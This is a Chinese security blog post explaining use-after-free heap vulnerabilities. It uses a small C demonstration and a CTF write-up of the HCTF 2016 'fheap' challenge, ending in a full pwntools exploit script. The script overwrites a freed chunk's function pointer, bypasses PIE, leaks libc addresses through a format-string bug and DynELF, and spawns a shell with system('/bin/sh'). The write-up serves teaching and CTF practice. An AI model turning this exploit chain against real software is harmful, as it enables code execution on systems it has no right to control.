> 原文链接: https://www.anquanke.com//post/id/85281 


# 【技术分享】逆向安全系列：Use After Free漏洞浅析


                                阅读量   
                                **499869**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



****

**[![](https://p3.ssl.qhimg.com/t01533f33a3a4ded5c9.jpg)](https://p3.ssl.qhimg.com/t01533f33a3a4ded5c9.jpg)**

**作者：**[**ray_cp******](http://bobao.360.cn/member/contribute?uid=2796348634)

**预估稿费：300RMB（不服你也来投稿啊！）**

**<strong><strong>投稿方式：发送邮件至**[**linwei#360.cn**](mailto:linwei@360.cn)**，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**</strong></strong>



**一、前言**



想着接下来要写一个use after free的小总结，刚好碰巧最近的湖湘杯2016的一题—-game利用use after free可以解出来。这题是自己第一次在比较正式的比赛中做出pwn题，做这题的时间花了不少，效率不高，但自己还是蛮开心的，后面回头做hctf2016的fheap这题，也可以用uaf解出来，game这题题目的复杂度稍微高一点，描述起来有点难，下面主要是用hctf的这道题来给大家讲述原理。对于uaf漏洞，搜了下，uaf漏洞在浏览器中存在很多，有兴趣的同学可以自己去查查。

<br>

**二、uaf原理**



uaf漏洞产生的主要原因是释放了一个堆块后，并没有将该指针置为NULL，这样导致该指针处于悬空的状态，同样被释放的内存如果被恶意构造数据，就有可能会被利用。先上一段代码给大家一个直观印象再具体解释。



```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
typedef void (*func_ptr)(char *);
void evil_fuc(char command[])
`{`
system(command);
`}`
void echo(char content[])
`{`
printf("%s",content);
`}`
int main()
`{`
func_ptr *p1=(int*)malloc(4*sizeof(int));
printf("malloc addr: %pn",p1);
p1[3]=echo;
p1[3]("hello worldn");
free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针
p1[3]("hello againn"); //p1指针未被置空,虽然free了,但仍可使用.
func_ptr *p2=(int*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.
printf("malloc addr: %pn",p2);
printf("malloc addr: %pn",p1);//p2与p1指针指向的内存为同一地址
p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.
p1[3]("whoami");
return 0;
`}`
```

这段代码在32位系统下执行。通过这段代码可以大概将uaf的利用过程小结为以下过程：

1、申请一段空间，并将其释放，释放后并不将指针置为空，因此这个指针仍然可以使用，把这个指针简称为p1。

2、申请空间p2，由于malloc分配的过程使得p2指向的空间为刚刚释放的p1指针的空间，构造恶意的数据将这段内存空间布局好，即覆盖了p1中的数据。

3、利用p1，一般多有一个函数指针，由于之前已使用p2将p1中的数据给覆盖了，所以此时的数据既是我们可控制的，即可能存在劫持函数流的情况。

<br>

**三、hctf2016–fheap**



 uaf原理还比较简单，下面就是具体的实践了，这个漏洞复杂一些的话就和double free这些其他的堆的常见利用方法合起来一起出题，具体的可以看bctf2015的freenote。不过fheap这题用uaf直接就解决了。还有就是湖湘杯2016的game题，和fheap基本上是一样的，这题大家跟出来了的话可以去做下game试下。先介绍fheap的功能。

**A、程序功能**

[![](https://p0.ssl.qhimg.com/t01375bdcf2219e93ae.png)](https://p0.ssl.qhimg.com/t01375bdcf2219e93ae.png)

程序提供的功能比较简单，总共两个功能：

**1、create string**

[![](https://p0.ssl.qhimg.com/t01b3c5d4e2f8d29bdb.png)](https://p0.ssl.qhimg.com/t01b3c5d4e2f8d29bdb.png)

输入create 后，接着输入size，后输入具体的字符串。相关的数据结构则是：先申请0x20字节的堆块存储结构，如果输入的字符串长度大于0xf，则另外申请对应长度的空间存储字符串，否则直接存储在之前申请的0x20字节的前16字节处，在最后，会将相关free函数的地址存储在堆存储结构的后八字节处。相关示意图描绘如下：

[![](https://p4.ssl.qhimg.com/t01de9a0cdd0857a62e.png)](https://p4.ssl.qhimg.com/t01de9a0cdd0857a62e.png)

**2、delete string**

调用存储在结构体里的free_func这个指针来释放堆，由于在释放以后没有将指针置空，出现了释放后仍可利用的现象，即uaf。

[![](https://p0.ssl.qhimg.com/t01aed647fd097d9f4e.png)](https://p0.ssl.qhimg.com/t01aed647fd097d9f4e.png)

**B、查看防护机制**

首先查看开启的安全机制

[![](https://p4.ssl.qhimg.com/t01a053864a6e8a3623.png)](https://p4.ssl.qhimg.com/t01a053864a6e8a3623.png)

可以看到开启了PIE，在解题的过程中还需要绕过PIE，PIE是指代码段的地址也会随机化，不过低两位的字节是固定的，利用这一点我们可以来泄露出程序的地址。

**C、利用思路**

总思路：首先是利用uaf，利用堆块之间申请与释放的步骤，形成对free_func指针的覆盖。从而达到劫持程序流的目的。具体来说，先申请的是三个字符创小于0xf的堆块，并将其释放。此时fastbin中空堆块的单链表结构如下左图，紧接着再申请一个字符串长度为0x20的字符串，此时，申请出来的堆中的数据会如下右图，此时后面申请出来的堆块与之前申请出来的1号堆块为同一内存空间，这时候输入的数据就能覆盖到1号堆块中的free_func指针，指向我们需要执行的函数，随后再调用1号堆块的free_func函数，即实现了劫持函数流的目的。

[![](https://p0.ssl.qhimg.com/t015295ad0ff28884c4.png)](https://p0.ssl.qhimg.com/t015295ad0ff28884c4.png)

1、绕过PIE，在能劫持函数流之后，首先是泄露出程序的地址以绕过PIE，具体的方法是将free_func指针的最低位覆盖成"x2d"，变成去执行fputs函数，最后变成去打印出free_func的地址，从而得到程序的基地址等。

[![](https://p4.ssl.qhimg.com/t0107caa11279c8c4ee.png)](https://p4.ssl.qhimg.com/t0107caa11279c8c4ee.png)

2、泄露system函数地址，首先有了程序的地址后，可以得到printf函数的plt地址，从而想办法在栈中部署数据，使用格式化字符串打印出我们需要的地址中的内容，使用DynELF模块去泄露地址，具体可以看安全客之前有人写的一篇文章—借助DynELF实现无libc的漏洞利用小结。从而泄露出system函数的地址。

3、执行system("/bin/sh")

最终调用system函数开启shell。

**D、最终exp**

exp最终如下，里面还有部分注释。

```
from pwn import *
from ctypes import *
DEBUG = 1
if DEBUG:
     p = process('./fheap')
else:
     r = remote('172.16.4.93', 13025)
print_plt=0
def create(size,content):
    p.recvuntil("quit")
    p.send("create ")
    p.recvuntil("size:")
    p.send(str(size)+'n')
    p.recvuntil('str:')
    p.send(content.ljust(size,'x00'))
    p.recvuntil('n')[:-1]
def delete(idx):
   p.recvuntil("quit")
   p.send("delete "+'n')
   p.recvuntil('id:')
    p.send(str(idx)+'n')
    p.recvuntil('sure?:')
    p.send('yes '+'n')
def leak(addr):
    delete(0)
    #printf函数格式化字符串打印第九个参数地址中的数据，第九个刚好是输入addr的位置
    data='aa%9$s'+'#'*(0x18-len('aa%9$s'))+p64(print_plt)
    create(0x20,data)
    p.recvuntil("quit")
    p.send("delete ")
    p.recvuntil('id:')
    p.send(str(1)+'n')
    p.recvuntil('sure?:')
    p.send('yes01234'+p64(addr))
    p.recvuntil('aa')
    data=p.recvuntil('####')[:-4]
    data += "x00"
    return data
def pwn():
    global print_plt
     create(4,'aa')
     create(4,'bb')
    create(4,'cc')
     delete(2)
    delete(1)
    delete(0)
    #申请三个堆块,随后删除，从而在fastbin链表中形成三个空的堆块
    #part1 覆盖到fputs函数，绕过PIE
    data='a'*0x10+'b'*0x8+'x2D'+'x00'#第一次覆盖，泄露出函数地址。
    create(0x20,data)#在这里连续创建两个堆块，从而使输入的data与前面的块1公用一块内存。
    delete(1)#这里劫持函数程序流
    p.recvuntil('b'*0x8)
    data=p.recvuntil('1.')[:-2]
    if len(data)&gt;8:
        data=data[:8]
    data=u64(data.ljust(8,'x00'))-0xA000000000000 #这里减掉的数可能不需要，自行调整
     proc_base=data-0xd2d
    print "proc base",hex(proc_base)
    print_plt=proc_base+0x9d0
    print "print plt",hex(print_plt)
    delete(0)
    data='a'*0x10+'b'*0x8+'x2D'+'x00'
    create(0x20,data)
    delete(1)
    p.recvuntil('b'*0x8)
    data=p.recvuntil('1.')[:-2]
    #part2 使用DynELF泄露system函数地址
     d = DynELF(leak, proc_base, elf=ELF('./fheap'))
    system_addr = d.lookup('system', 'libc')
    print "system_addr:", hex(system_addr)
    
    #parts 执行system函数，开启shell
    delete(0)
    data='/bin/sh;'+'#'*(0x18-len('/bin/sh;'))+p64(system_addr)
    create(0x20,data)
    delete(1)
    p.interactive()

    ####
    #利用的方式总结为
    #delete(0)，将申请出来的堆块添入到fastbin中
    #create(0x20,data),连续申请两个堆块，数据覆盖1堆中的free_func指针
     #delete(1)劫持函数流，调用我们覆盖的指针处的地址
    ###

    if __name__ == '__main__':
            pwn()
```

执行结果

[![](https://p1.ssl.qhimg.com/t012c2919e192ac8001.png)](https://p1.ssl.qhimg.com/t012c2919e192ac8001.png)

<br>

**四、小结**



我感觉UAF最主要的是，在释放了堆块以后没有将指针置空，后续过程中内存空间数据被覆盖为其他数据后，该指针仍然可以正常使用该内存，从而导致数据的误用。ctf题中容易碰见的是，释放的堆块中原本某个区域是用来存储函数指针的，后面被恶意构造的数据覆盖成其他地址实现了劫持函数流的目的，从而有可能就被pwn掉了。

道理就是这个道理，后面给大家推荐两个题目，一个是pwnable里面的uaf，一个是湖湘杯的game（好像这题也是今年xnuca的原题），大家可以看下。pwnable里面的uaf是覆盖虚函数，我觉得有个大佬的文章写得也蛮好，在后面链接中贴出来。

<br>

**五、参考文章**

[HCTF 2016网络攻防大赛官方Writeup](http://www.freebuf.com/articles/web/121778.html) 

[FlappyPig HCTF2016 Writeup](http://bobao.360.cn/ctf/detail/179.html)

[pwnable.kr之uaf](http://blog.csdn.net/qq_20307987/article/details/51511230)

[借助DynELF实现无libc的漏洞利用小结](http://m.bobao.360.cn/learning/detail/3298.html)



**六、相关文档**

[CVE-2014-1772 – IE浏览器 Use After Free 漏洞详细分析](http://bobao.360.cn/learning/detail/88.html)
